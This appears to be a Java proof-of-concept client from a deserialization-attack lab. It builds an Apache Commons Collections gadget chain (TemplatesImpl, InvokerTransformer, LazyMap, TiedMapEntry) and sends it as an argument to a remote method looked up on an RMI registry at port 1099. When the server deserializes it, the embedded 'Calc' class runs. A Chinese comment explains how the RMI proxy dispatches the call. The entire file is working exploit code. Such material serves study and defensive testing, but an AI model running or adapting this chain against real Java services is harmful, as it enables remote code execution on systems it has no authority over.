package RMI.CAS;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import util.Calc;
import util.Utils;

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.HashMap;
import java.util.Map;

public class RMIClient {
    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = Utils.creatTemplatesImpl(Calc.class);
        Transformer invokerTransformer = new InvokerTransformer("getClass", null, null);
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, invokerTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap, templates);
        HashMap expMap = new HashMap();
        expMap.put(tiedMapEntry, "value");
        outerMap.clear();
        Utils.setFieldValue(invokerTransformer, "iMethodName", "newTransformer");

        Registry registry = LocateRegistry.getRegistry(1099);
        TestInterface remoteObj = (TestInterface) registry.lookup("test");
        // 获取到的远程对象实际上是一个代理对象，请求会被派发到RemoteObjectInvocationHandler#invoke方法里面去
        remoteObj.testMethod(expMap);
    }
}
